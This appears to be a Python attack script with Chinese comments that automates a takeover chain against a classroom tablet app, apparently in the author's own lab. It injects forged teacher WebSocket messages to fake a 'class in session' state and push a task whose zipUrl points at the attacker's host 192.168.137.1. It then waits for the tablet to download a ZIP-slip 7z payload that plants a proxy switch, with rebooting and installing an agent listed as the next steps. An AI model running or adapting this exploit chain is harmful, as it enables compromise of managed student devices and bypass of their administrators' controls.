# -*- coding: utf-8 -*-
"""full_chain_run.py - 【夜禁解除后一键走通】制造"上课中" → 触发自动下载 → 解压 → 代理开关
前提: 平板在线、App 已进入课堂且 WS(8889) 已连接
用法: python full_chain_run.py
脚本会:
  1) 等待并确认 WS 连接(读 ws8889.log 的 frame_in/syn)
  2) 注入 type=400 制造上课中(attendClass=2, setClassTime=true)
  3) 注入 type=0 任务(resourceInfo.zipUrl = 我们的 7z)
  4) 监控冒充器日志, 等待端侧下载我们的载荷([PAYLOAD-SERVE2]/lab2.7z)
  5) 输出每一步的验证结果与下一步提示
"""
import io
import json
import os
import re
import time

BASE = os.path.dirname(os.path.abspath(__file__))
WSDIR = BASE
INJ = os.path.join(WSDIR, "ws_inject.txt")
WSLOG = os.path.join(WSDIR, "ws8889.log")
SPOOFLOG = os.path.join(WSDIR, "npcap_http80.log")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
PAYLOAD = "lab2.7z"   # 冒充器 /lab2.7z -> payload_proxy.7z (ZIP-SLIP)


def env(mtype, data, cid, tag, cmd=2, frm="teacher"):
    return json.dumps({
        "cmd": cmd, "ct": "", "from": frm, "gt": 0, "cId": cid,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
    }, ensure_ascii=False)


def write_inj(text):
    with io.open(INJ, "w", encoding="utf-8") as f:
        f.write(text)


def tail(path, n=200):
    try:
        with io.open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.readlines()[-n:]
    except Exception:
        return []


def ws_connected():
    for ln in tail(WSLOG, 80):
        m = re.search(r'\[stat\].*"frame_in":\s*(\d+).*"ws_open":\s*(\d+)', ln)
        if m and int(m.group(2)) > 0:
            return True
    return False


def spoof_stat():
    st = {}
    for ln in tail(SPOOFLOG, 40):
        m = re.search(r'\[stat\]\s*(\{.*\})', ln)
        if m:
            try:
                st = json.loads(m.group(1))
            except Exception:
                pass
    return st


def wait_for(cond, timeout, label):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if cond():
            print("  ✓ %s" % label, flush=True)
            return True
        time.sleep(3)
    print("  ✗ %s (超时 %ds)" % (label, timeout), flush=True)
    return False


def main():
    print("=" * 70)
    print(" 完整接管链一键执行（夜禁解除后运行）")
    print("=" * 70)

    # 步骤 1: WS 连接
    print("\n[1] 等待 App 课堂 WS 连接 ...")
    if not wait_for(ws_connected, 180, "WS 已连接(ws_open>0)"):
        print("  请先在平板上进入课堂桌面，再重跑本脚本。")
        return
    base = spoof_stat()
    print("  当前冒充器统计: %s" % base)

    # 步骤 2: 制造上课中
    print("\n[2] 注入 type=400 SynchronousSignBean(setClassTime=true, attendClass=2)")
    sign = {
        "attendClass": 2, "setClassTime": True, "signType": 1,
        "classroomId": ROOM, "roomId": "LAB_ROOM1",
        "taskId": "LAB_T9", "userId": 2112229, "desktopId": "LAB_D9",
        "isPlay": 0, "isSilent": 1, "isSignFinish": 1,
        "isTeaStartSignTask": 1, "openAdvanceSignOut": 0, "classMode": 0,
        "childTaskId": {},
    }
    write_inj(env(400, json.dumps(sign, ensure_ascii=False), "CH0001", "online_tag"))
    time.sleep(10)
    write_inj(env(400, json.dumps(sign, ensure_ascii=False), "CH0002", "online_tag"))
    time.sleep(8)
    print("  (端侧应出现「上课中」提示，或状态栏变化)")

    # 步骤 3: 任务触发
    print("\n[3] 注入 type=0 任务(zipUrl=http://%s/%s)" % (OUR, PAYLOAD))
    now = int(time.time() * 1000)
    td = {
        "taskId": "LAB_T9", "subTaskId": "LAB_S9", "allTaskId": "LAB_T9",
        "classroomId": ROOM, "classroomName": "lab",
        "desktopId": "LAB_D9", "subDesktopId": "LAB_D9",
        "defaultDesktopId": "LAB_D9", "defaultDesktopName": "lab",
        "sourceId": "LAB_R9", "itemType": 1, "taskType": 1,
        "taskCreateMode": 1, "pptSource": 1, "isFromPPT": 0,
        "number": 1, "originTotalNumber": 1, "content": "lab",
        "memo": "", "createTime": now, "expectedSendDate": now,
        "completed": False, "showStatus": 1, "percent": 0, "progress": "0",
        "positive": 1, "negative": 0, "score": 0.0, "studyTime": 0,
        "viewedIds": "", "viewedNum": 0,
        "resourceInfo": {"sourceId": "LAB_R9", "taskId": "LAB_T9",
                         "name": "lab", "type": 1,
                         "zipUrl": "http://%s/%s" % (OUR, PAYLOAD),
                         "url": "http://%s/%s" % (OUR, PAYLOAD),
                         "createTime": now},
    }
    write_inj(env(0, json.dumps(td, ensure_ascii=False), "CH0003", "canvas_tag"))
    time.sleep(12)

    # 步骤 4: 等待下载
    print("\n[4] 等待端侧下载我们的载荷 ...")

    def downloaded():
        st = spoof_stat()
        return st.get("payload_serve", 0) > base.get("payload_serve", 0) or \
            st.get("req", 0) > base.get("req", 0) + 1

    if wait_for(downloaded, 120, "端侧已请求我们的 7z 载荷"):
        print("\n  ★★ 闸门已打开：端侧下载了我们的载荷")
        print("  ★ Z7Extractor 解压后应写入 /mnt/sdcard/xhproxy/<密文>")
        print("  ★ 下一步: 重启平板 → 启动器读代理开关 → 代理(18080) → 安装 agent")
    else:
        print("\n  未触发下载。排查方向:")
        print("   · 平板是否真的处于「上课中」(看屏幕状态)")
        print("   · App 是否在前台课堂桌面(WS 监听消息)")
        print("   · 可重跑本脚本 / 检查 logs 中的 [PAYLOAD-SERVE2]")

    print("\n最终冒充器统计: %s" % spoof_stat())
    print("完成。")


if __name__ == "__main__":
    main()
